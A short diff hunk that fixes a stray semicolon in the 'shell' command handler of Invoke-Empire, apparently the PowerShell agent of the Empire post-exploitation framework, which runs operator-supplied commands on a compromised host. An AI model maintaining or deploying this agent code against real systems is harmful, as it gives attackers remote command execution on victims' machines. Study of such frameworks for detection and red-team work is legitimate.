@@ -275,7 +275,7 @@ function Invoke-Empire {
         $output = '';
         if ($cmd.ToLower() -eq 'shell') {
             # if we have a straight 'shell' command, skip the aliases
-            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' };
+            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
             else {
                 $OldConsoleOut = [Console]::Out;
                 $StringWriter = New-Object IO.StringWriter;
